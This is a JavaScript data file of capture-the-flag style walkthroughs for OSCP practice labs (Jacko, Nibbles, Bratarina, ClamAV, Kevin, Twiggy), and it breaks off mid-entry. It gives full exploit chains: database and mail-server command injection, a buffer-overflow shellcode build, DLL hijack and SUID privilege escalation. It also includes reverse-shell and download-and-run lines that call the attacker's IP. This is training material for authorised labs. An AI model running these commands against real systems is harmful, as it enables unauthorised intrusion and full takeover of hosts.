/* Step-by-step walkthroughs for labs, shown on the lab page.
   Built by build_guides.py. {K} is your Kali IP and {T} the target IP. */
window.OSCP_GUIDES = {
 "pgp-jacko": {
  "title": "Windows · H2 database → PaperStream privesc",
  "ips": {
   "K": "192.168.45.180",
   "T": "192.168.153.66"
  },
  "steps": [
   {
    "h": "Recon",
    "b": [
     {
      "t": "code",
      "lang": "bash",
      "v": "sudo nmap -p- --min-rate 5000 -Pn {T} -oN jacko_ports.txt\nsudo nmap -sC -sV -p 80,135,139,445,5040,8082,9092 -Pn {T} -oN jacko_svc.txt"
     },
     {
      "t": "out",
      "v": "80/tcp   open  http     Microsoft IIS 10.0  |_http-title: H2 Database Engine (redirect)\n445/tcp  open  microsoft-ds?\n8082/tcp open  http     H2 database http console\n9092/tcp open  XmlIpcRegSvc?"
     },
     {
      "t": "p",
      "v": "🎯 The lead is the **H2 web console on port 8082**."
     }
    ]
   },
   {
    "h": "Get into the H2 console",
    "b": [
     {
      "t": "p",
      "v": "Browse to `http://{T}:8082` and log in with:"
     },
     {
      "t": "list",
      "v": [
       "JDBC URL: `jdbc:h2:~/test`",
       "User: `sa`",
       "Password: blank ✅ (the default works)"
      ]
     },
     {
      "t": "p",
      "v": "The footer shows **H2 1.4.199**, which is vulnerable to JNI code execution (**EDB-49384**)."
     }
    ]
   },
   {
    "h": "RCE through SQL (EDB-49384)",
    "b": [
     {
      "t": "code",
      "lang": "bash",
      "v": "searchsploit h2 1.4.199\nsearchsploit -m 49384"
     },
     {
      "t": "p",
      "v": "Paste the queries from `49384.txt` into the console in this order:"
     },
     {
      "t": "list",
      "v": [
       "`SELECT CSVWRITE('C:\\Windows\\Temp\\JNIScriptEngine.dll', ...)`: the long hex blob from the file, which drops the DLL.",
       "Load it, create the eval alias and test it:"
      ]
     },
     {
      "t": "code",
      "lang": "sql",
      "v": "CREATE ALIAS IF NOT EXISTS System_load FOR \"java.lang.System.load\";\nCALL System_load('C:\\Windows\\Temp\\JNIScriptEngine.dll');\nCREATE ALIAS IF NOT EXISTS JNIScriptEngine_eval FOR \"JNIScriptEngine.eval\";\nCALL JNIScriptEngine_eval('new java.util.Scanner(java.lang.Runtime.getRuntime().exec(\"whoami\").getInputStream()).useDelimiter(\"\\\\Z\").next()');"
     },
     {
      "t": "out",
      "v": "jacko\\tony"
     },
     {
      "t": "p",
      "v": "🎉 Code execution as **tony**."
     }
    ]
   },
   {
    "h": "Reverse shell",
    "b": [
     {
      "t": "p",
      "v": "On Kali, serve nc.exe and start a listener:"
     },
     {
      "t": "code",
      "lang": "bash",
      "v": "cp /usr/share/windows-resources/binaries/nc.exe .\npython3 -m http.server 80"
     },
     {
      "t": "code",
      "lang": "bash",
      "v": "rlwrap nc -lvnp 8082"
     },
     {
      "t": "p",
      "v": "Run these through H2, one at a time (they replace the `exec(\"...\")` part):"
     },
     {
      "t": "code",
      "lang": "sql",
      "v": "CALL JNIScriptEngine_eval('new java.util.Scanner(java.lang.Runtime.getRuntime().exec(\"certutil -urlcache -split -f http://{K}/nc.exe C:/Users/tony/nc.exe\").getInputStream()).useDelimiter(\"\\\\Z\").next()');"
     },
     {
      "t": "code",
      "lang": "sql",
      "v": "CALL JNIScriptEngine_eval('new java.util.Scanner(java.lang.Runtime.getRuntime().exec(\"C:/Users/tony/nc.exe {K} 8082 -e cmd.exe\").getInputStream()).useDelimiter(\"\\\\Z\").next()');"
     },
     {
      "t": "warn",
      "v": "Call back on **port 8082**. Egress is filtered, so use a port the box already uses."
     }
    ]
   },
   {
    "h": "Fix the broken PATH (Jacko-specific)",
    "b": [
     {
      "t": "p",
      "v": "`whoami` says \"not recognized\" until you run this:"
     },
     {
      "t": "code",
      "lang": "cmd",
      "v": "set PATH=%PATH%;C:\\Windows\\System32;C:\\Windows\\System32\\WindowsPowerShell\\v1.0;\nwhoami\ntype C:\\Users\\tony\\Desktop\\local.txt"
     },
     {
      "t": "flag",
      "v": "local.txt captured"
     }
    ]
   },
   {
    "h": "Privesc enumeration",
    "b": [
     {
      "t": "code",
      "lang": "cmd",
      "v": "whoami /priv\ndir \"C:\\Program Files (x86)\"\ntype \"C:\\Program Files (x86)\\PaperStream IP\\TWAIN\\readmeenu.rtf\""
     },
     {
      "t": "p",
      "v": "Found **PaperStream IP (TWAIN) 1.42**, which is vulnerable to **EDB-49382**: a DLL hijack through the FJTWSVIC service, which runs as SYSTEM."
     }
    ]
   },
   {
    "h": "SYSTEM via PaperStream (EDB-49382)",
    "b": [
     {
      "t": "p",
      "v": "On Kali:"
     },
     {
      "t": "code",
      "lang": "bash",
      "v": "searchsploit -m 49382\nmv 49382.ps1 exploit.ps1\nmsfvenom -p windows/shell_reverse_tcp LHOST={K} LPORT=8082 -f dll -o UninOldIS.dll\npython3 -m http.server 80"
     },
     {
      "t": "p",
      "v": "In `exploit.ps1`, set `$PayloadFile = \"C:\\Windows\\Temp\\UninOldIS.dll\"`."
     },
     {
      "t": "p",
      "v": "Start a new listener (kill the old one, or use another tab):"
     },
     {
      "t": "code",
      "lang": "bash",
      "v": "rlwrap nc -lvnp 8082"
     },
     {
      "t": "p",
      "v": "On the target:"
     },
     {
      "t": "code",
      "lang": "cmd",
      "v": "cd C:\\Windows\\Temp\ncertutil -urlcache -split -f http://{K}/UninOldIS.dll UninOldIS.dll\ncertutil -urlcache -split -f http://{K}/exploit.ps1 exploit.ps1\npowershell -ep bypass C:\\Windows\\Temp\\exploit.ps1"
     },
     {
      "t": "out",
      "v": "nt authority\\system"
     },
     {
      "t": "code",
      "lang": "cmd",
      "v": "type C:\\Users\\Administrator\\Desktop\\proof.txt"
     },
     {
      "t": "flag",
      "v": "proof.txt captured 👑"
     }
    ]
   }
  ],
  "backup": {
   "h": "Backup route: GodPotato",
   "b": [
    {
     "t": "p",
     "v": "If `whoami /priv` shows **SeImpersonatePrivilege** enabled:"
    },
    {
     "t": "code",
     "lang": "cmd",
     "v": "certutil -urlcache -split -f http://{K}/GodPotato-NET4.exe C:\\Windows\\Temp\\gp.exe\nC:\\Windows\\Temp\\gp.exe -cmd \"C:\\Users\\tony\\nc.exe {K} 8082 -e cmd.exe\""
    }
   ]
  },
  "takeaways": [
   "🔑 Try **default creds** on every web console (`sa` with a blank password).",
   "🌐 A reverse shell that dies means **egress is filtered**: reuse an open port like 8082 or 80.",
   "🛠️ A shell where nothing works usually means a **broken PATH**: set it by hand.",
   "📂 Always check `Program Files (x86)` for third-party software, then `searchsploit` its version."
  ],
  "setup": {
   "h": "Setup: lab folder + session log",
   "b": [
    {
     "t": "p",
     "v": "Do this first, in every new terminal, so everything you run is **saved for later**:"
    },
    {
     "t": "code",
     "lang": "bash",
     "v": "mkdir -p ~/oscp/jacko/{scans,loot,exploits} && cd ~/oscp/jacko\nscript -a -q session_$(date +%F_%H%M).log      # records everything you type and see\nexport T={T}; echo \"T=$T\" >> notes.txt"
    },
    {
     "t": "list",
     "v": [
      "`script` keeps recording until you type `exit`. Replay it later with `cat session_*.log`.",
      "Save every login the moment you find it: `echo 'user:pass  (where)' >> loot/creds.txt`",
      "Keep the output files of nmap (`-oN`), ffuf (`-o`) and anything piped through `| tee file.txt`.",
      "Take a screenshot of `whoami`, `ipconfig`/`ip a` and each flag: the exam report needs them."
     ]
    }
   ]
  }
 },
 "pgp-nibbles": {
  "title": "Linux · Postgres RCE → SUID find",
  "ips": {
   "K": "192.168.45.180",
   "T": "192.168.153.47"
  },
  "steps": [
   {
    "h": "Recon",
    "b": [
     {
      "t": "code",
      "lang": "bash",
      "v": "sudo nmap -p- --min-rate 5000 -Pn {T} -oN nibbles_ports.txt\nsudo nmap -sC -sV -p 21,22,80,139,445,5437 -Pn {T} -oN nibbles_svc.txt"
     },
     {
      "t": "out",
      "v": "21/tcp   open   ftp         vsftpd 3.0.3\n22/tcp   open   ssh         OpenSSH 7.9p1 Debian\n80/tcp   open   http        Apache httpd 2.4.38\n139/tcp  closed netbios-ssn\n445/tcp  closed microsoft-ds\n5437/tcp open   postgresql  PostgreSQL DB 11.3 - 11.7"
     },
     {
      "t": "p",
      "v": "🎯 The lead is **PostgreSQL on port 5437**, an odd port that only a full `-p-` scan finds."
     }
    ]
   },
   {
    "h": "Dead ends",
    "b": [
     {
      "t": "code",
      "lang": "bash",
      "v": "ftp {T}\ncurl -s http://{T}/"
     },
     {
      "t": "p",
      "v": "❌ FTP has no anonymous login, and the website is a static page. Move on."
     }
    ]
   },
   {
    "h": "Postgres default creds",
    "b": [
     {
      "t": "code",
      "lang": "bash",
      "v": "psql -h {T} -p 5437 -U postgres"
     },
     {
      "t": "p",
      "v": "Password: `postgres`"
     },
     {
      "t": "code",
      "lang": "sql",
      "v": "SELECT version();\n\\du"
     },
     {
      "t": "out",
      "v": "PostgreSQL 11.7 (Debian 11.7-0+deb10u1)\n postgres | Superuser, Create role, Create DB, Replication, Bypass RLS"
     },
     {
      "t": "p",
      "v": "✅ You are a **superuser**, so `COPY FROM PROGRAM` gives RCE (CVE-2019-9193)."
     }
    ]
   },
   {
    "h": "Read files (optional)",
    "b": [
     {
      "t": "code",
      "lang": "sql",
      "v": "SELECT pg_read_file('/etc/passwd', 0, 2000);"
     },
     {
      "t": "out",
      "v": "wilson:x:1000:1000:...:/home/wilson:/bin/bash"
     },
     {
      "t": "p",
      "v": "The user is **wilson**."
     }
    ]
   },
   {
    "h": "RCE",
    "b": [
     {
      "t": "code",
      "lang": "sql",
      "v": "DROP TABLE IF EXISTS cmd_exec;\nCREATE TABLE cmd_exec(cmd_output text);\nCOPY cmd_exec FROM PROGRAM 'id';\nSELECT * FROM cmd_exec;"
     },
     {
      "t": "out",
      "v": "uid=106(postgres) gid=113(postgres) groups=113(postgres),112(ssl-cert)"
     },
     {
      "t": "p",
      "v": "🎉 Code execution as **postgres**."
     }
    ]
   },
   {
    "h": "Reverse shell",
    "b": [
     {
      "t": "p",
      "v": "On Kali:"
     },
     {
      "t": "code",
      "lang": "bash",
      "v": "rlwrap nc -lvnp 80"
     },
     {
      "t": "p",
      "v": "In psql:"
     },
     {
      "t": "code",
      "lang": "sql",
      "v": "COPY cmd_exec FROM PROGRAM 'bash -c \"bash -i >& /dev/tcp/{K}/80 0>&1\"';"
     },
     {
      "t": "out",
      "v": "postgres@nibbles:/var/lib/postgresql/11/main$"
     },
     {
      "t": "warn",
      "v": "Egress is filtered, so call back on **port 80**. psql hangs while the shell is open, which is normal."
     }
    ]
   },
   {
    "h": "Stabilise the shell and grab local.txt",
    "b": [
     {
      "t": "code",
      "lang": "bash",
      "v": "python3 -c 'import pty;pty.spawn(\"/bin/bash\")'\nexport TERM=xterm"
     },
     {
      "t": "p",
      "v": "Press `Ctrl+Z`, then on Kali run `stty raw -echo; fg` and press Enter."
     },
     {
      "t": "code",
      "lang": "bash",
      "v": "cat /home/wilson/local.txt"
     },
     {
      "t": "flag",
      "v": "local.txt captured"
     }
    ]
   },
   {
    "h": "Privesc enumeration",
    "b": [
     {
      "t": "code",
      "lang": "bash",
      "v": "find / -perm -u=s -type f 2>/dev/null"
     },
     {
      "t": "out",
      "v": "/usr/bin/su\n/usr/bin/mount\n/usr/bin/passwd\n/usr/bin/find      <-- not normal!\n/usr/bin/sudo"
     },
     {
      "t": "p",
      "v": "🎯 `find` has the SUID bit set, and it's on **GTFOBins**."
     }
    ]
   },
   {
    "h": "Root",
    "b": [
     {
      "t": "code",
      "lang": "bash",
      "v": "/usr/bin/find . -exec /bin/sh -p \\; -quit\nid\ncat /root/proof.txt"
     },
     {
      "t": "out",
      "v": "uid=106(postgres) gid=113(postgres) euid=0(root)"
     },
     {
      "t": "warn",
      "v": "The `-p` flag is required. Without it, the shell drops the root privileges."
     },
     {
      "t": "flag",
      "v": "proof.txt captured 👑"
     }
    ]
   }
  ],
  "takeaways": [
   "🔍 Always run a **full port scan**: services hide on odd ports.",
   "🔑 For any database, try **default creds** first (`postgres:postgres`).",
   "💥 A Postgres superuser gets RCE through `COPY FROM PROGRAM`, no exploit needed.",
   "🌐 If a reverse shell fails, reuse port **80 or 443** to get past the egress filter.",
   "📂 Run `find / -perm -u=s` and check every unusual binary on **GTFOBins**."
  ],
  "setup": {
   "h": "Setup: lab folder + session log",
   "b": [
    {
     "t": "p",
     "v": "Do this first, in every new terminal, so everything you run is **saved for later**:"
    },
    {
     "t": "code",
     "lang": "bash",
     "v": "mkdir -p ~/oscp/nibbles/{scans,loot,exploits} && cd ~/oscp/nibbles\nscript -a -q session_$(date +%F_%H%M).log      # records everything you type and see\nexport T={T}; echo \"T=$T\" >> notes.txt"
    },
    {
     "t": "list",
     "v": [
      "`script` keeps recording until you type `exit`. Replay it later with `cat session_*.log`.",
      "Save every login the moment you find it: `echo 'user:pass  (where)' >> loot/creds.txt`",
      "Keep the output files of nmap (`-oN`), ffuf (`-o`) and anything piped through `| tee file.txt`.",
      "Take a screenshot of `whoami`, `ipconfig`/`ip a` and each flag: the exam report needs them."
     ]
    }
   ]
  }
 },
 "pgp-bratarina": {
  "title": "Linux · OpenSMTPD RCE → direct root",
  "lab": {
   "name": "Bratarina",
   "platform": "PG Practice",
   "os": "Linux"
  },
  "ips": {
   "K": "192.168.45.180",
   "T": "192.168.153.71"
  },
  "steps": [
   {
    "h": "Recon",
    "b": [
     {
      "t": "p",
      "v": "There is only **one flag** on this box: `proof.txt`."
     },
     {
      "t": "code",
      "lang": "bash",
      "v": "sudo nmap -p- --min-rate 5000 -Pn {T} -oN brat_ports.txt\nsudo nmap -sC -sV -p 22,25,53,80,445 -Pn {T} -oN brat_svc.txt"
     },
     {
      "t": "out",
      "v": "22/tcp  open   ssh          OpenSSH 7.6p1 Ubuntu\n25/tcp  open   smtp         OpenSMTPD\n53/tcp  closed domain\n80/tcp  open   http         nginx 1.14.0  (FlaskBB)\n445/tcp open   netbios-ssn  Samba smbd 4.7.6-Ubuntu"
     },
     {
      "t": "p",
      "v": "🎯 The leads are **SMB (445)** and **OpenSMTPD (25)**."
     }
    ]
   },
   {
    "h": "SMB null session",
    "b": [
     {
      "t": "code",
      "lang": "bash",
      "v": "smbclient -N -L //{T}/"
     },
     {
      "t": "out",
      "v": "backups   Disk   Share for backups"
     },
     {
      "t": "code",
      "lang": "bash",
      "v": "smbclient -N //{T}/backups"
     },
     {
      "t": "p",
      "v": "Inside the smbclient prompt:"
     },
     {
      "t": "code",
      "lang": "smb",
      "v": "get passwd.bak\nexit"
     },
     {
      "t": "code",
      "lang": "bash",
      "v": "cat passwd.bak"
     },
     {
      "t": "out",
      "v": "neil:x:1000:1000:neil,,,:/home/neil:/bin/bash"
     },
     {
      "t": "p",
      "v": "🐇 A rabbit hole: you get a username and nothing else. Move on to SMTP."
     }
    ]
   },
   {
    "h": "SMTP banner and searchsploit",
    "b": [
     {
      "t": "code",
      "lang": "bash",
      "v": "nc -nv {T} 25"
     },
     {
      "t": "out",
      "v": "220 bratarina ESMTP OpenSMTPD"
     },
     {
      "t": "code",
      "lang": "bash",
      "v": "searchsploit opensmtpd\nsearchsploit -m 47984"
     },
     {
      "t": "out",
      "v": "OpenSMTPD 6.6.1 - Remote Code Execution | linux/remote/47984.py"
     },
     {
      "t": "p",
      "v": "💥 **CVE-2020-7247**: commands are injected through the MAIL FROM field and run **as root**."
     }
    ]
   },
   {
    "h": "Confirm the RCE",
    "b": [
     {
      "t": "p",
      "v": "Terminal 1:"
     },
     {
      "t": "code",
      "lang": "bash",
      "v": "sudo tcpdump -i tun0 icmp"
     },
     {
      "t": "p",
      "v": "Terminal 2:"
     },
     {
      "t": "code",
      "lang": "bash",
      "v": "python3 47984.py {T} 25 'ping -c 2 {K}'"
     },
     {
      "t": "out",
      "v": "IP {T} > {K}: ICMP echo request"
     },
     {
      "t": "p",
      "v": "✅ RCE is confirmed."
     }
    ]
   },
   {
    "h": "Reverse shell as root",
    "b": [
     {
      "t": "code",
      "lang": "bash",
      "v": "rlwrap nc -lvnp 80"
     },
     {
      "t": "code",
      "lang": "bash",
      "v": "python3 47984.py {T} 25 'python -c \"import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\\\"{K}\\\",80));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\\\"/bin/sh\\\",\\\"-i\\\"])\"'"
     },
     {
      "t": "out",
      "v": "uid=0(root) gid=0(root) groups=0(root)"
     },
     {
      "t": "warn",
      "v": "Egress is filtered, so call back on **port 80**."
     }
    ]
   },
   {
    "h": "proof.txt",
    "b": [
     {
      "t": "code",
      "lang": "bash",
      "v": "python3 -c 'import pty;pty.spawn(\"/bin/bash\")'\ncat /root/proof.txt"
     },
     {
      "t": "flag",
      "v": "proof.txt captured 👑"
     }
    ]
   }
  ],
  "backup": {
   "h": "Backup route: host a script and fetch it",
   "b": [
    {
     "t": "code",
     "lang": "bash",
     "v": "echo 'bash -i >& /dev/tcp/{K}/80 0>&1' > shell.sh\npython3 -m http.server 445"
    },
    {
     "t": "code",
     "lang": "bash",
     "v": "python3 47984.py {T} 25 'wget http://{K}:445/shell.sh -O /tmp/shell.sh'\npython3 47984.py {T} 25 'bash /tmp/shell.sh'"
    }
   ]
  },
  "takeaways": [
   "📡 **Grab the banner** of every service, then `searchsploit` it.",
   "📂 Check SMB with a **null session** (`smbclient -N -L`).",
   "🐇 Don't get stuck on rabbit holes like passwd.bak.",
   "🏓 For blind RCE, confirm with `ping` and `tcpdump` first.",
   "🌐 To get past the egress filter, call back on ports the box already uses (**80, 445**).",
   "👑 A service running as root gives you root directly, with no privesc needed."
  ],
  "setup": {
   "h": "Setup: lab folder + session log",
   "b": [
    {
     "t": "p",
     "v": "Do this first, in every new terminal, so everything you run is **saved for later**:"
    },
    {
     "t": "code",
     "lang": "bash",
     "v": "mkdir -p ~/oscp/bratarina/{scans,loot,exploits} && cd ~/oscp/bratarina\nscript -a -q session_$(date +%F_%H%M).log      # records everything you type and see\nexport T={T}; echo \"T=$T\" >> notes.txt"
    },
    {
     "t": "list",
     "v": [
      "`script` keeps recording until you type `exit`. Replay it later with `cat session_*.log`.",
      "Save every login the moment you find it: `echo 'user:pass  (where)' >> loot/creds.txt`",
      "Keep the output files of nmap (`-oN`), ffuf (`-o`) and anything piped through `| tee file.txt`.",
      "Take a screenshot of `whoami`, `ipconfig`/`ip a` and each flag: the exam report needs them."
     ]
    }
   ]
  }
 },
 "pgp-clamav": {
  "title": "Linux · Sendmail + clamav-milter RCE → direct root",
  "lab": {
   "name": "ClamAV",
   "platform": "PG Practice",
   "os": "Linux"
  },
  "ips": {
   "K": "192.168.45.180",
   "T": "192.168.153.52"
  },
  "steps": [
   {
    "h": "Recon",
    "b": [
     {
      "t": "p",
      "v": "There is only **one flag**, `proof.txt`: the exploit drops you straight in as root."
     },
     {
      "t": "code",
      "lang": "bash",
      "v": "sudo nmap -p- --min-rate 5000 -Pn {T} -oN clam_ports.txt\nsudo nmap -sC -sV -p 22,25,80 -Pn {T} -oN clam_svc.txt"
     },
     {
      "t": "out",
      "v": "22/tcp open  ssh      OpenSSH 7.2p2 Ubuntu\n25/tcp open  smtp     Sendmail 8.15.2\n80/tcp open  http     Apache httpd 2.4.18"
     },
     {
      "t": "p",
      "v": "🎯 The lead is **Sendmail on 25**, paired with **clamav-milter** on this box."
     }
    ]
   },
   {
    "h": "SMTP banner",
    "b": [
     {
      "t": "code",
      "lang": "bash",
      "v": "nc -nv {T} 25"
     },
     {
      "t": "out",
      "v": "220 clamav ESMTP Sendmail 8.15.2"
     },
     {
      "t": "p",
      "v": "💥 **CVE-2007-4560**: the `RCPT TO` field is passed to a shell, so commands run **as root**."
     }
    ]
   },
   {
    "h": "Find the exploit",
    "b": [
     {
      "t": "code",
      "lang": "bash",
      "v": "searchsploit clamav\nsearchsploit -m 4761"
     },
     {
      "t": "out",
      "v": "Sendmail with clamav-milter < 0.91.2 - Remote Root Command Execution | 4761.pl"
     }
    ]
   },
   {
    "h": "Manual exploit, part 1: download the payload",
    "b": [
     {
      "t": "p",
      "v": "On Kali, make the payload and host it:"
     },
     {
      "t": "code",
      "lang": "bash",
      "v": "echo 'bash -i >& /dev/tcp/{K}/80 0>&1' > shell.sh\npython3 -m http.server 80"
     },
     {
      "t": "p",
      "v": "Open an SMTP session and inject through the backticks in `RCPT TO`:"
     },
     {
      "t": "code",
      "lang": "bash",
      "v": "nc -nv {T} 25"
     },
     {
      "t": "code",
      "lang": "smtp",
      "v": "HELO x\nMAIL FROM: <root>\nRCPT TO: <nobody+`wget http://{K}/shell.sh -O /tmp/s.sh`>\nDATA\ntest\n.\nQUIT"
     },
     {
      "t": "p",
      "v": "Wait for `GET /shell.sh` in the web server window, then stop it with `Ctrl+C`."
     },
     {
      "t": "warn",
      "v": "Keep the **nobody+** format with its backticks exactly as shown: the backticks are what run the command."
     }
    ]
   },
   {
    "h": "Manual exploit, part 2: run it as root",
    "b": [
     {
      "t": "warn",
      "v": "The web server and the listener both need **port 80** on Kali (egress is filtered), and only one can use it at a time. Stop the web server before you start the listener."
     },
     {
      "t": "code",
      "lang": "bash",
      "v": "rlwrap nc -lvnp 80"
     },
     {
      "t": "p",
      "v": "A second mail runs the payload:"
     },
     {
      "t": "code",
      "lang": "bash",
      "v": "nc -nv {T} 25"
     },
     {
      "t": "code",
      "lang": "smtp",
      "v": "HELO x\nMAIL FROM: <root>\nRCPT TO: <nobody+`bash /tmp/s.sh`>\nDATA\ntest\n.\nQUIT"
     },
     {
      "t": "out",
      "v": "uid=0(root) gid=0(root) groups=0(root)"
     },
     {
      "t": "p",
      "v": "👑 Root shell on the listener."
     }
    ]
   },
   {
    "h": "proof.txt",
    "b": [
     {
      "t": "code",
      "lang": "bash",
      "v": "python3 -c 'import pty;pty.spawn(\"/bin/bash\")'\ncat /root/proof.txt"
     },
     {
      "t": "flag",
      "v": "proof.txt captured 👑"
     }
    ]
   }
  ],
  "backup": {
   "h": "Backup route: the automated exploit",
   "b": [
    {
     "t": "p",
     "v": "Same order: web server on 80 for the first command, then stop it and start the listener on 80 for the second."
    },
    {
     "t": "code",
     "lang": "bash",
     "v": "perl 4761.pl {T} 'wget http://{K}/shell.sh -O /tmp/s.sh'\nperl 4761.pl {T} 'bash /tmp/s.sh'"
    },
    {
     "t": "p",
     "v": "Keep download and execute as two commands: a single chained one is unreliable through the milter."
    }
   ]
  },
  "takeaways": [
   "📧 **Sendmail + clamav** is a signature combo: go straight to CVE-2007-4560.",
   "📖 Read the **header/usage** of any downloaded exploit: argument order varies between copies.",
   "🖐️ Prefer the **manual method** when a scripted exploit is flaky.",
   "✂️ Split **download** and **execute** into two steps.",
   "🌐 Egress filtered? Reuse **port 80** for hosting and the callback, one at a time.",
   "👑 RCE as a root service means a **direct root shell**, no privesc stage."
  ],
  "setup": {
   "h": "Setup: lab folder + session log",
   "b": [
    {
     "t": "p",
     "v": "Do this first, in every new terminal, so everything you run is **saved for later**:"
    },
    {
     "t": "code",
     "lang": "bash",
     "v": "mkdir -p ~/oscp/clamav/{scans,loot,exploits} && cd ~/oscp/clamav\nscript -a -q session_$(date +%F_%H%M).log      # records everything you type and see\nexport T={T}; echo \"T=$T\" >> notes.txt"
    },
    {
     "t": "list",
     "v": [
      "`script` keeps recording until you type `exit`. Replay it later with `cat session_*.log`.",
      "Save every login the moment you find it: `echo 'user:pass  (where)' >> loot/creds.txt`",
      "Keep the output files of nmap (`-oN`), ffuf (`-o`) and anything piped through `| tee file.txt`.",
      "Take a screenshot of `whoami`, `ipconfig`/`ip a` and each flag: the exam report needs them."
     ]
    }
   ]
  }
 },
 "pgp-kevin": {
  "title": "Windows · HP Power Manager BOF → direct SYSTEM",
  "ips": {
   "K": "192.168.45.180",
   "T": "192.168.153.58"
  },
  "steps": [
   {
    "h": "Recon",
    "b": [
     {
      "t": "p",
      "v": "The overflow lands you straight as SYSTEM, so there's **no separate privesc**."
     },
     {
      "t": "code",
      "lang": "bash",
      "v": "sudo nmap -p- --min-rate 5000 -Pn {T} -oN kevin_ports.txt\nsudo nmap -sC -sV -p 80,135,139,445,3389 -Pn {T} -oN kevin_svc.txt"
     },
     {
      "t": "out",
      "v": "80/tcp   open  http          HP Power Manager\n135/tcp  open  msrpc\n445/tcp  open  microsoft-ds\n3389/tcp open  ms-wbt-server"
     },
     {
      "t": "p",
      "v": "🎯 The lead is the **web app on port 80**."
     }
    ]
   },
   {
    "h": "Enumerate the web app",
    "b": [
     {
      "t": "code",
      "lang": "bash",
      "v": "curl -s -I http://{T}/"
     },
     {
      "t": "p",
      "v": "Open `http://{T}/`: it's the **HP Power Manager Administration** login. Log in with the default **admin : admin**."
     },
     {
      "t": "p",
      "v": "The banner shows **HP Power Manager 4.2 build 13**, which is vulnerable to a stack buffer overflow."
     }
    ]
   },
   {
    "h": "Find the exploit",
    "b": [
     {
      "t": "code",
      "lang": "bash",
      "v": "searchsploit hp power manager\nsearchsploit -m 10099"
     },
     {
      "t": "out",
      "v": "HP Power Manager 'formExportDataPoints' Buffer Overflow | 10099.pl"
     }
    ]
   },
   {
    "h": "Generate shellcode (bad chars matter)",
    "b": [
     {
      "t": "code",
      "lang": "bash",
      "v": "msfvenom -p windows/shell_reverse_tcp LHOST={K} LPORT=443 \\\n  -b \"\\x00\\x0a\\x0d\\x25\\x26\\x2b\\x3d\" -f c -e x86/alpha_mixed EXITFUNC=thread"
     },
     {
      "t": "warn",
      "v": "The payload goes in a POST body, so it must be URL-safe. The bad chars are null, CR, LF and `% & + =`. **alpha_mixed** keeps it alphanumeric."
     }
    ]
   },
   {
    "h": "Edit and run EDB-10099",
    "b": [
     {
      "t": "p",
      "v": "In `10099.pl`, set the **target IP**, paste the **shellcode** from the last step, and check the **return address** matches HPPM 4.2."
     },
     {
      "t": "code",
      "lang": "bash",
      "v": "rlwrap nc -lvnp 443"
     },
     {
      "t": "code",
      "lang": "bash",
      "v": "perl 10099.pl {T}"
     },
     {
      "t": "out",
      "v": "C:\\Windows\\system32> whoami\nnt authority\\system"
     },
     {
      "t": "p",
      "v": "👑 Straight to **SYSTEM**."
     },
     {
      "t": "warn",
      "v": "Egress is filtered, so call back on **port 443** (or 80)."
     }
    ]
   },
   {
    "h": "Flags",
    "b": [
     {
      "t": "code",
      "lang": "cmd",
      "v": "type C:\\Users\\Administrator\\Desktop\\proof.txt\ndir C:\\Users /s /b | findstr local.txt"
     },
     {
      "t": "flag",
      "v": "proof.txt captured 👑"
     }
    ]
   }
  ],
  "backup": {
   "h": "Backup route: Metasploit (your one allowed use)",
   "b": [
    {
     "t": "code",
     "lang": "msf",
     "v": "use exploit/windows/http/hp_power_manager_filename\nset RHOSTS {T}\nset LHOST {K}\nset LPORT 443\nset payload windows/shell_reverse_tcp\nrun"
    }
   ]
  },
  "takeaways": [
   "🔑 Old admin panels: try **default creds** (admin:admin), then fingerprint the exact version.",
   "🧬 For any public BOF, **regenerate the shellcode** with msfvenom. The bundled one is dead.",
   "🚫 Respect **bad characters**: HTTP and login overflows usually kill `\\x00 \\x0a \\x0d % & + =`.",
   "🌐 Callback not landing? **Egress filtering**: use port 443 or 80.",
   "👑 A service that overflows while running as SYSTEM gives a **direct SYSTEM shell**.",
   "1️⃣ Keep Metasploit as your **single allowed use**. Get the manual EDB route working first."
  ],
  "setup": {
   "h": "Setup: lab folder + session log",
   "b": [
    {
     "t": "p",
     "v": "Do this first, in every new terminal, so everything you run is **saved for later**:"
    },
    {
     "t": "code",
     "lang": "bash",
     "v": "mkdir -p ~/oscp/kevin/{scans,loot,exploits} && cd ~/oscp/kevin\nscript -a -q session_$(date +%F_%H%M).log      # records everything you type and see\nexport T={T}; echo \"T=$T\" >> notes.txt"
    },
    {
     "t": "list",
     "v": [
      "`script` keeps recording until you type `exit`. Replay it later with `cat session_*.log`.",
      "Save every login the moment you find it: `echo 'user:pass  (where)' >> loot/creds.txt`",
      "Keep the output files of nmap (`-oN`), ffuf (`-o`) and anything piped through `| tee file.txt`.",
      "Take a screenshot of `whoami`, `ipconfig`/`ip a` and each flag: the exam report needs them."
     ]
    }
   ]
  }
 },
 "pgp-twiggy": {
  "title": "Linux · SaltStack → direct root",
  "ips": {
   "K": "192.168.45.180",
   "T": "192.168.153.60"
  },
  "steps": [
   {
    "h": "Recon",
    "b": [
     {
      "t": "p",
      "v": "salt-master runs as root, so RCE here **is** root."
     },
     {
      "t": "code",
      "lang": "bash",
      "v": "sudo nmap -p- --min-rate 5000 -Pn {T} -oN twiggy_ports.txt\nsudo nmap -sC -sV -p 22,53,80,4505,4506,8000 -Pn {T} -oN twiggy_svc.txt"
     },
     {
      "t": "out",
      "v": "4505/tcp open  zmtp   ZeroMQ ZMTP 2.0\n4506/tcp open  zmtp   ZeroMQ ZMTP 2.0\n8000/tcp open  http   SaltStack rest_cherrypy"
     },
     {
      "t": "p",
      "v": "🎯 Ports **4505/4506** are a SaltStack master. Port 8000 leaks version **3000**."
     }
    ]
   },
   {
    "h": "Vuln: CVE-2020-11651 (auth bypass) + CVE-2020-11652 (traversal)",
    "b": [
     {
      "t": "code",
      "lang": "bash",
      "v": "searchsploit saltstack\nsearchsploit -m 48421     # or your offline jasperla PoC"
     }
    ]
   },
   {
    "h": "Confirm RCE",
    "b": [
     {
      "t": "code",
      "lang": "bash",
      "v": "python3 exploit.py --master {T} --exec 'id'"
     },
     {
      "t": "out",
      "v": "uid=0(root) gid=0(root)"
     },
     {
      "t": "p",
      "v": "✅ Running as root."
     }
    ]
   },
   {
    "h": "Reverse shell as root",
    "b": [
     {
      "t": "code",
      "lang": "bash",
      "v": "rlwrap nc -lvnp 80"
     },
     {
      "t": "code",
      "lang": "bash",
      "v": "python3 exploit.py --master {T} --exec 'bash -c \"bash -i >& /dev/tcp/{K}/80 0>&1\"'"
     },
     {
      "t": "warn",
